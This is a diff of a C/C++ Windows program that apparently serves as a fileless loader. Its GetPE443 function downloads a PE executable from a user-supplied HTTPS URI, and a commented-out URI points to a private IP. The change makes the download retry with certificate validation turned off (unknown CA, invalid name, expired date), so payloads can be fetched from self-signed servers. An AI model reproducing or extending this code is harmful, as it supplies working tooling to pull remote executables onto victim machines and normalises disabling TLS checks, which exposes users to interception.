@@ -1,4 +1,4 @@
-﻿#include <WinSock2.h>
+#include <WinSock2.h>
 #include <Windows.h>
 #include <stdio.h>
 #include <winhttp.h>
@@ -380,32 +380,65 @@ char* GetPE443(LPCWSTR domain, LPCWSTR path) {
     HINTERNET  hSession = NULL,
         hConnect = NULL,
         hRequest = NULL;
+    
     // Use WinHttpOpen to obtain a session handle.
     hSession = WinHttpOpen(L"WinHTTP Example/1.0",
         WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
         WINHTTP_NO_PROXY_NAME,
         WINHTTP_NO_PROXY_BYPASS, 0);
-
+    
     // https://github.com/D1rkMtr/test/blob/main/MsgBoxArgs.exe?raw=true
     // Specify an HTTP server.
     if (hSession)
         hConnect = WinHttpConnect(hSession,domain ,
             INTERNET_DEFAULT_HTTPS_PORT, 0);
-
+    
     // Create an HTTP request handle.
     if (hConnect)
         hRequest = WinHttpOpenRequest(hConnect, L"GET", path,
             NULL, WINHTTP_NO_REFERER,
             WINHTTP_DEFAULT_ACCEPT_TYPES,
             WINHTTP_FLAG_SECURE);
+    
+    //ignore any TLS errors 
+    //option = hRequest.Option[WinHttpRequestOption_SslErrorIgnoreFlags];
+    //options = options | SslErrorFlag_Ignore_All;
+    //http.Option[WinHttpRequestOption_SslErrorIgnoreFlags] = option;
 
-    // Send a request.
+    //SslErrorFlag_Ignore_All                                  0x3300
+    //Unknown certification authority (CA) or untrusted root   0x0100
+    //Wrong usage                                              0x0200
+    //Invalid common name (CN)                                 0x1000
+    //Invalid date or certificate expired                      0x2000
+
+
+    // Send a request. HERE IS THE ERROR
     if (hRequest)
         bResults = WinHttpSendRequest(hRequest,
             WINHTTP_NO_ADDITIONAL_HEADERS,
             0, WINHTTP_NO_REQUEST_DATA, 0,
             0, 0);
 
+    if (GetLastError() == ERROR_WINHTTP_SECURE_FAILURE)
+    {
+        DWORD dwFlags =
+            SECURITY_FLAG_IGNORE_UNKNOWN_CA |
+            SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE |
+            SECURITY_FLAG_IGNORE_CERT_CN_INVALID |
+            SECURITY_FLAG_IGNORE_CERT_DATE_INVALID;
+
+        WinHttpSetOption(
+            hRequest,
+            WINHTTP_OPTION_SECURITY_FLAGS,
+            &dwFlags,
+            sizeof(dwFlags));
+
+        if (hRequest)
+            bResults = WinHttpSendRequest(hRequest,
+                WINHTTP_NO_ADDITIONAL_HEADERS,
+                0, WINHTTP_NO_REQUEST_DATA, 0,
+                0, 0);
+    }
 
     // End the request.
     if (bResults)
@@ -449,7 +482,7 @@ char* GetPE443(LPCWSTR domain, LPCWSTR path) {
 
         if (PEbuf.empty() == TRUE)
         {
-            printf("Failed in retrieving the PE");
+            printf("Failed in retrieving the PE.\n");
         }
 
 
@@ -802,7 +835,8 @@ int main(int argc, char** argv) {
 
     printf("\n[+] Enter the uri :\n");
     char uri[250] = "";
-    char argument[100] = "";
+    //char uri[250] = "https://10.40.131.132:443/iamhere";
+    char argument[100] = " ";
     scanf("%s", uri);
     char* PE = NULL;
 
